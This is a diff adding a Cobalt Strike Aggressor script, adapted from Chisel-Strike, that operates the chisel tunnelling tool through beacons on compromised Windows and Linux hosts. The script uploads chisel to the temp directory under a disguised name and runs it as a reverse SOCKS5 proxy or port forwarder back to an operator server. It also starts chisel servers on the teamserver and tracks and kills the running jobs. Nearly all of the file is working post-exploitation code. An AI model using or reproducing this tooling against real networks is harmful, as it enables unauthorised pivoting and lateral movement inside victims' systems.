@@ -1,0 +1,505 @@
+# Some code taken from: https://github.com/m3rcer/Chisel-Strike
+# Global VARS
+# folder 'modules' and files must located on the teamserver
+# change chisel username/pass if you need
+$CHISELPATHWIN = "modules/chisel_win.exe";
+$CHISELPATHLIN = "modules/chisel_linux";
+$CHISELTMSX64 = "modules/chisel64";
+$CHISELTMSX86 = "modules/chisel86";
+$cur_dir = cwd();
+$CHISELLOGFILE = "$cur_dir\/logs\/chisel_client_job_pids.log";
+$CHISELTMSLOGFILE = "$cur_dir\/logs\/chisel_tms_job_pids.log";
+chisel_user = "<YOUR_USER>";
+$chisel_pass = "<YOUR_PASS>";
+$kill = "NULL";
+$job = 0;
+$upload = 0;
+
+# Check permissions
+if (-canwrite $CHISELLOGFILE) {
+	show_message("Can write to $CHISELLOGFILE");
+}
+else {
+	show_error("Cannot write to file. Create the $CHISELLOGFILE manually and add write permissions. Then reload script again.");
+	exit("Permissions");
+}
+
+if (-canwrite $CHISELTMSLOGFILE) {
+	show_message("Can write to $CHISELTMSLOGFILE");
+}
+else {
+	show_error("Cannot write to file. Create the $CHISELTMSLOGFILE manually and add write permissions. Then reload script again.");
+	exit("Permissions");
+}
+
+
+alias "chisel" {
+	local('$args $binary $location $cmd $netcmd $xorstring $xorurl $computer');
+	$args_check = substr($0, 7);
+	$args_chisel = "$2 $3 $4 $5 $6 $7 $8 $9 $10 $11 $12 $13";
+	if (($args_check eq "") || ($args_check eq " ") || ($2 eq "") || ($2 eq " ")) {
+		btask($1, "\c4Arguments are required. Try again. \cBExamples\:\n" . 
+			"\cBSocks5\:\n	\c8chisel client <serv_IP>:\c8<serv_port> R:\c8<socks_IP>:\c8<socks_port>:\c8socks\n" .
+			"	\c8chisel server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --socks5 --reverse\n" .
+			"\n\cBTarget\'s local port forwarding to our host\:\n	\c8chisel client <serv_IP>:\c8<serv_port> R:\c8<our_local_IP>:\c8<our_local_port>:\c8127.0.0.1:\c8<target_local_port>/tcp\n" .
+			"	\c8chisel server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --reverse\n" .
+			"\n\cBTarget\'s port forwarding to our host\:\n	\c8chisel client <serv_IP>:\c8<serv_port> R:\c8<our_local_IP>:\c8<our_local_port>:\c8<target_IP>:\c8<target_port>/tcp\n" .
+			"	\c8chisel server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --reverse\n" .
+			"\n\cBHelp is available here\:\c8 https\:\c8//github.com/jpillora/chisel\n" .
+			"\c7Attention\:\c7 \'--auth\' will be added to chisel client automatically!\n" . 
+			"\c7Also you need to start the server first on the TeamServer \(chisel-tms\) or your host.\n");
+		exit("Args");
+	}
+	bsleep($1, 5, 0);
+	$bd = bdata($1);
+	$os = $bd['os'];
+	if ("$os" ismatch '[lL]inux*')
+	{
+		bshell!($1, 'if [ -f "/tmp/ch001" ]; then echo "ChiselLinExists"; else echo "ChiselLinNotExists"; fi')
+	}
+	else if ("$os" ismatch '[wW]indows.*')
+	{
+		bshell!($1, 'if exist "c:\windows\temp\ch001.exe" ( echo ChiselWinExists) else ( echo ChiselWinNotExists)');
+	}
+	else
+	{
+		btask($1, "OS Check error!");
+	}
+}
+
+alias "chisel-jobs" {
+	$job = "Display_jobs";
+	bjobs!($1);
+}
+
+alias "chisel-kill" {
+	if (($2 eq "" ) || ($2 eq " ") || ($2 eq "  ")) {
+		btask($1, "\c4Argument is required (ALL or PID). Try again.\n\c8help chisel-kill");
+		exit("Args");
+	}
+	$kill = $2;
+	bjobs!($1);
+	
+}
+
+sub chisel_upload {
+	if ($2 eq "Windows") {
+		bcd($1, 'c:\windows\temp');
+		bupload($1, $CHISELPATHWIN);
+		bshell($1, 'move c:\windows\temp\chisel_win.exe c:\windows\temp\ch001.exe');
+		$upload = "WinUploaded";
+		bjobs!($1);
+	}
+	else if ($2 eq "Linux") {
+		bcd($1, '/tmp');
+		bupload($1, $CHISELPATHLIN);
+		bshell($1, "mv /tmp/chisel_linux /tmp/ch001");
+		bshell($1, "chmod +x /tmp/ch001");
+		$upload = "LinUploaded";
+		bjobs!($1);
+	}
+}
+
+sub chisel_run_client {
+	local('$aca $ch_type $ch_socks_ip $ch_fwd_type $ch_socks_port $ch_fwd_loc_ip $ch_fwd_loc_port $ch_fwd_ip $ch_fwd_port');
+	$aca = split(' ', $2);
+	$ch_type = $aca[0];
+	if ($ch_type eq "client") {
+		foreach $var ($aca) {
+			$rema = split(':', $var);
+			$srema = size($rema);
+			if ('R:' isin $var) {
+				if ('socks' eq $rema) {
+					$ch_fwd_type = 'socks';
+					if ($srema == 3) {
+						$ch_socks_ip = '127.0.0.1';
+						$ch_socks_port = $rema[1];
+					}
+					else if ($srema == 4) {
+						$ch_socks_ip = $rema[1];
+						$ch_socks_port = $rema[2];
+					}
+				}
+				else {
+					$ch_fwd_type = 'portfwd';
+					if ($srema == 4) {
+						$ch_fwd_loc_ip = '127.0.0.1';
+						$ch_fwd_loc_port = $rema[1];
+						$ch_fwd_ip = $rema[2];
+						$ch_fwd_port = $rema[3];
+					}
+					else if ($srema == 5) {
+						$ch_fwd_loc_ip = $rema[1];
+						$ch_fwd_loc_port = $rema[2];
+						$ch_fwd_ip = $rema[3];
+						$ch_fwd_port = $rema[4];
+					}
+				}
+			}
+			if ($srema == 2) {
+				$str_size = size(split('\.', $rema[0]));
+				if ($str_size == 4) {
+					$ch_serv_ip = $rema[0];
+					$ch_serv_port = $rema[1];
+				}
+			}
+		}
+	}
+	else {
+		btask($1, "\c4This functional is not supported. Use the chisel manually.\n");
+		exit("Not supp.");
+	}
+	$ch_args = replace($2, "client ", "");
+	$ch_args = replace($ch_args, "\\s+", " ");
+	if ($3 eq "Windows") {
+		blog($1, "Run win");
+		$ch_comm = "c:\\windows\\temp\\ch001.exe client --max-retry-count 10 --auth $chisel_user\:$chisel_pass $ch_args";
+		bshell($1, $ch_comm);
+		$computer = beacon_info($1, "computer");
+		elog(mynick() . " executed $ch_comm at $computer");
+		$job = "Add_job";
+		bjobs!($1);
+	}
+	else if ($3 eq "Linux") {
+		blog($1, "Run Lin");
+		$ch_comm = "/tmp/ch001 client --max-retry-count 10 --auth $chisel_user\:$chisel_pass $ch_args";
+		bshell($1, $ch_comm);
+		$computer = beacon_info($1, "computer");
+		elog(mynick() . " executed $ch_comm at $computer");
+	}
+
+	if ($ch_fwd_type eq 'socks') {
+		blog($1, "\n\cBSocks5 on port $ch_socks_port via chisel will be runned. Wait it. Then add proxy in /etc/proxychains.conf:\n" .
+			"\c8socks5 $ch_socks_ip $ch_socks_port\n\cBCheck the chisel's server. This command must be run before on the $ch_serv_ip\:\n" .
+			"\c8chisel server --auth $chisel_user\:$chisel_pass -p $ch_serv_port --socks5 --reverse\n");
+	}
+	else if ($ch_fwd_type eq 'portfwd') {
+		blog($1, "\n\cBPort $ch_fwd_ip\:$ch_fwd_port will be forwarded via chisel to $ch_fwd_loc_ip\:$ch_fwd_loc_port\. Wait it.\n" .
+			"\cBCheck the chisel's server. This command must be run before on the $ch_serv_ip\:\n" .
+			"\c8chisel server --auth $chisel_user\:$chisel_pass -p $ch_serv_port --reverse\n");
+	} 
+}
+
+on beacon_output {
+	if ("ChiselWinExists" isin $2) {
+		# btask($1, "Run chisel Win1");
+		chisel_run_client($1, $args_chisel, "Windows");
+	}
+	else if ("ChiselWinNotExists" isin $2) {
+		chisel_upload($1, "Windows");
+		# btask($1, "Run uploading");
+	}
+	else if ("ChiselLinExists" isin $2) {
+		# btask($1, "Run chisel Lin1");
+		chisel_run_client($1, $args_chisel, "Linux");
+	}
+	else if ("ChiselLinNotExists" isin $2) {
+		chisel_upload($1, "Linux");
+		# btask($1, "Run uploading");
+	}
+}
+
+on beacon_output_jobs {
+	if ("WinUploaded" isin $upload) {
+		# btask($1, "Run chisel Win2");
+		chisel_run_client($1, $args_chisel, "Windows");
+	}
+	else if ("LinUploaded" isin $upload) {
+		# btask($1, "Run chisel Lin2");
+		chisel_run_client($1, $args_chisel, "Linux");
+	}
+
+	if ("Add_job" isin $job) {
+		local('$handle $outpath $jid $pid $task $entry $computer');
+		$bd = bdata($1);
+		$computer = beacon_info($1,"computer");
+
+		if (-exists $CHISELLOGFILE) {
+			$handle = openf(">>$CHISELLOGFILE");
+			foreach $entry (split("\n", $2)) {
+				($jid, $pid, $task) = split("\\s+", $entry);
+				if ($pid) {
+					println($handle, "$computer\:$pid");
+					btask($1, "\cBChisel job running on \c9$computer \cBwith \c9PID $pid");
+				}
+				else {
+					btask($1, "No chisel jobs found running on " . $computer);
+				}
+			}
+			closef($handle);
+		}
+		else {
+			createNewFile("$CHISELLOGFILE");
+			if (checkError($error)) {
+				btask($1, "Unable to create file: $error\nCreate the file $CHISELLOGFILE and restart.");
+			}
+			$handle = openf(">>$CHISELLOGFILE");
+			foreach $entry (split("\n", $2)) {
+				($jid, $pid, $task) = split("\\s+", $entry);
+				if ($pid) {
+					println($handle, "$computer\:$pid");
+					btask($1, "\cBChisel job running on the \c9$computer \cBwith \c9PID $pid");
+				}
+				else {
+					btask($1, "No chisel jobs found running on \c9$computer");
+				}
+			}
+			closef($handle);
+		}
+	}
+
+	if ("Display_jobs" isin $job) {
+		local('$jcomp $jpid $phandle $phandle2 $pid $pidfile $computer $bd $line $size $size2 $jp $jt');
+		$bd = bdata($1);
+		$computer = beacon_info($1,"computer");
+		$phandle = openf("$CHISELLOGFILE");
+		@data = readAll($phandle);
+		@jobs = @();
+		foreach $line (@data) {
+			($jcomp, $jpid) = split(":", $line);
+			if ($computer eq $jcomp) {
+				push(@jobs, $jpid);
+			}
+		}
+		$size = size(@jobs);
+		if ($size != 0) {
+			btask($1, "\cBChisel job(s) running on the \c9$computer \cBwith \c9PID:");
+			foreach $jp (@jobs) {
+				blog($1, "\c9$jp");
+			}
+			btask($1, "\n");
+		}
+		else {
+			btask($1, "\cBNo chisel job(s) running on the \c9$computer\n");
+		}
+		closef($phandle);
+
+		$phandle2 = openf("$CHISELTMSLOGFILE");
+		@data2 = readAll($phandle2);
+		$size2 = size(@data2);
+		if (($size2 != 0) && (@data2[0] ne "NULL")) {
+			btask($1, "\cBChisel job(s) running on the TeamServer:");
+			foreach $jt (@data2) {
+				blog($1, "\c9$jt");
+			}
+			btask($1, "\n");
+		}
+		else {
+			btask($1, "\cBNo chisel job(s) running on the TeamServer\n");
+		}
+		closef($phandle2);
+	}
+
+	if ($kill eq "ALL") {
+		$bd = bdata($1);
+		$computer = beacon_info($1,"computer");
+		local('$phandle $pidfile $pid')
+		$phandle = openf("$CHISELLOGFILE");
+		@data = readAll($phandle);
+		@jobs = @();
+		@new_data = @();
+		foreach $line (@data) {
+			($jcomp, $jpid) = split(":", $line);
+			if ($computer eq $jcomp) {
+				push(@jobs, $jpid);
+			}
+			else {
+				push(@new_data, "$jcomp\:$jpid");
+			}
+		}
+		$size = size(@jobs);
+		if ($size != 0) {
+			foreach $jp (@jobs) {
+				bkill!($1, $jp);
+				btask($1, "\cBTerminated chisel job \c4PID $jp");
+				elog(mynick() . " killed all chisel on $computer");
+			}
+		}
+		else {
+			btask($1, "No chisel jobs found running on \c7$computer\o to terminate");
+		}
+		$whandle = openf(">$CHISELLOGFILE");
+		foreach $new (@new_data) {
+			println($whandle, $new);
+		}
+		closef($phandle);
+		closef($whandle);
+	}
+	else if (($kill ne "NULL") && ($kill ne "ALL")) {
+		$bd = bdata($1);
+		$computer = beacon_info($1,"computer");
+		$phandle = openf("$CHISELLOGFILE");
+		@data = readAll($phandle);
+		@jobs = @();
+		@new_data = @();
+		foreach $line (@data) {
+			($jcomp, $jpid) = split(":", $line);
+			if (($computer eq $jcomp) && (($kill eq $jpid) || ($kill == $jpid))) {
+				push(@jobs, $jpid);
+			}
+			else {
+				push(@new_data, "$jcomp\:$jpid");
+			}
+		}
+		$size = size(@jobs);
+		if ($size != 0) {
+			foreach $jp (@jobs) {
+				bkill!($1, $jp);
+				btask($1, "\cBTerminated chisel job \c4PID $jp");
+				elog(mynick() . " killed chisel PID $kill on $computer");
+			}
+		}
+		else {
+			btask($1, "No chisel jobs found running on \c7$computer \owith PID \c7$kill\o to terminate");
+		}
+		$whandle = openf(">$CHISELLOGFILE");
+		foreach $new (@new_data) {
+			println($whandle, $new);
+		}
+		closef($phandle);
+		closef($whandle);
+	}
+	else if ($kill eq "NULL") {
+		$kill = "NULL";
+	}
+	$job = 0;
+	$upload = 0;
+	$kill = "NULL";
+}
+
+alias "chisel-tms" {
+	local('$args_check $props $handle $arch $exe $cmd');
+	$tms_ip = localip();
+	# Parsing Args
+	$args_check = substr($0, 11);
+	$args_chisel = "$2 $3 $4 $5 $6 $7 $8 $9 $10 $11 $12 $13";
+	if (($args_check eq "") || ($args_check eq " ") || ($2 eq "") || ($2 eq " ")) {
+		btask($1, "\c4Arguments are required. Try again. \cBExamples\:\n" . 
+			"\cBSocks5\:\n	\c8chisel-tms server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --socks5 --reverse\n" .
+			"\n\cBTarget\'s local port forwarding to our host\:\n	\c8chisel-tms server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --reverse\n" .
+			"\n\cBTarget\'s port forwarding to our host\:\n	\c8chisel-tms server --auth $chisel_user\:\c8$chisel_pass -p <serv_port> --reverse\n" .
+			"\n\cBHelp is available here\:\c8 https\:\c8//github.com/jpillora/chisel\n" .
+			"\c7The chisel server will be started on the current TeamServer \(IP is \c8$tms_ip\c7\)\n");
+		exit("Args");
+	}
+
+	$args_split = split(' ', $args_chisel);
+	foreach $index => $value ($args_split) {
+		if ($value eq "-p") {
+			$next_index = $index + 1;
+			$tms_serv_port = $args_split[$next_index];
+		}
+	}
+	if (-is64 $1) {
+			$arch = "x64";
+			$exe = $CHISELTMSX64;
+		}
+		else {
+			$arch = "x86";
+			$exe = $CHISELTMSX86;
+		}
+	%props = systemProperties();
+	$os = %props["os.name"];
+	if (("$os" ismatch '[lL]inux*') || ("$os" ismatch '[mM]ac OS.*')) {
+		$cmd = "$exe $+  $args_chisel";
+		btask($1, "Executing on $os Teamserver \($tms_ip\)\: $cmd");
+		$process = exec("$cmd");
+		@data = fork($process);
+		closef($process);
+	}
+	else if ("$os" ismatch '[wW]indows.*') {
+		$cmd = "$exe $+ \.exe $+  $args_chisel";
+		btask($1, "Executing on $os Teamserver \($tms_ip\)\: $cmd");
+		$process = exec("$cmd");
+		@data = fork($process);
+		closef($process);
+	}
+	else
+	{
+		btask($1, "OS Check error!");
+		exit("OS error");
+	}
+	
+	$cmd = replace($cmd, "\\s+", " ");
+	if (-exists $CHISELTMSLOGFILE) {
+		$handle2 = openf(">>$CHISELTMSLOGFILE");
+		println($handle2, $cmd);
+		closef($handle2);
+	}
+	else {
+		btask($1, "Create the file $CHISELTMSLOGFILE and restart");
+		exit("Not exists");
+	}
+}
+
+alias "chisel-tms-kill" {
+	local('$args $binary $location $cmd $tmskill $whandle');
+	$tms_ip = localip();
+	%props = systemProperties();
+	$os = %props["os.name"];
+	btask($1, "Terminating \c4all chisel jobs\o on $os teamserver \($tms_ip\)");
+	if (-is64 $1) {
+		$TMSKILLNIX = "tools/tmskill64.sh";
+		$TMSKILLWIN = "tools/tmskill64.bat";
+	}
+	else {
+		$TMSKILLNIX = "tools/tmskill86.sh";
+		$TMSKILLWIN = "tools/tmskill86.bat";
+	}
+	
+	if (("$os" ismatch '[lL]inux*') || ("$os" ismatch '[mM]ac OS.*')) {
+		$cmd = "/bin/bash $TMSKILLNIX";
+		$process = exec("$cmd");
+		@data = fork($process);
+		closef($process);
+	}
+	else if ("$os" ismatch '[wW]indows.*') {
+		$cmd = "powershell $TMSKILLWIN";
+		$process = exec("$cmd");
+		@data = fork($process);
+		closef($process);
+	}
+	else
+	{
+		btask($1, "OS Check error!");
+	}
+	$empty = "NULL";
+	$whandle = openf(">$CHISELTMSLOGFILE");
+	println($whandle, $empty);
+	closef($whandle);
+	elog(mynick() . " killed all chisel jobs on $os teamserver");
+}
+
+# Alias definitions
+beacon_command_register("chisel-tms", "Run Chisel on your teamserver", 
+	"\nRun chisel on your windows/linux teamserver\n\n" .
+	"\c7Usage: chisel [command]\n\n" .
+	"Commands:\n" .
+	"   server - runs chisel in server mode\n" .
+	"   client - runs chisel in client mode\n\n" .
+	"Read more:\n" .
+	"   https://github.com/jpillora/chisel\n");
+
+beacon_command_register("chisel", "Run Chisel on a beacon", 
+	"\nRun chisel on a beacon\n\n" .
+	"\c7Usage: chisel [command]\n\n" .
+	"Commands:\n" .
+	"   client - runs chisel in client mode\n\n" .
+	"Read more:\n" .
+	"   https://github.com/jpillora/chisel\n");
+
+beacon_command_register("chisel-jobs", "List active chisel jobs on the teamserver and beacon", 
+	"\nList running chisel jobs on the teamserver and beacon\n\n" .
+	"\c7Usage: chisel-jobs\n");
+
+beacon_command_register("chisel-kill", "Kill chisel jobs on a beacon", 
+	"\nAutomatically kill chisel jobs running on a beacon\n\n" .
+	"\c7Usage: chisel-kill [command]\n" .
+	"Commands:\n" .
+	"	ALL - kill all jobs\n" .
+	"	<num_of_PID> - kill job with typed PID\n\n");
+
+beacon_command_register("chisel-tms-kill", "Kill chisel jobs on the teamserver", 
+	"\nAutomatically kill chisel all jobs running on the teamserver\n\n" .
+	"\c7Usage: chisel-tms-kill\n\n");
+ 
